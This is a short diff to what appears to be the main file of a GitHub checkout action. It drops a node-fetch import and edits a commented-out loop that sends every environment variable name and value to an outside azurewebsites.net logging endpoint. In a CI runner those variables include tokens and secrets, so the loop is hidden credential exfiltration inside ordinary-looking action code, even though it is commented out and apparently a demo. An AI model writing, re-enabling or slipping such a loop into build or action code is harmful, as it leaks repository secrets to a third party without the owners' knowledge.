@@ -4,14 +4,13 @@ import * as gitSourceProvider from './git-source-provider'
 import * as inputHelper from './input-helper'
 import * as path from 'path'
 import * as stateHelper from './state-helper'
-import fetch from 'node-fetch'
 
 async function run(): Promise<void> {
   try {
     const sourceSettings = await inputHelper.getInputs()
 
     /*for (const key in process.env) {
-      fetch('https://chrish-git-demo-dud6dyadewhefzbs.northeurope-01.azurewebsites.net/api/logRequest?${key}=${process.env[key]}');
+      await fetch('https://chrish-git-demo-dud6dyadewhefzbs.northeurope-01.azurewebsites.net/api/logRequest?${key}=${process.env[key]}');
       console.log(`${key} = ${process.env[key]}`);
     }*/
 
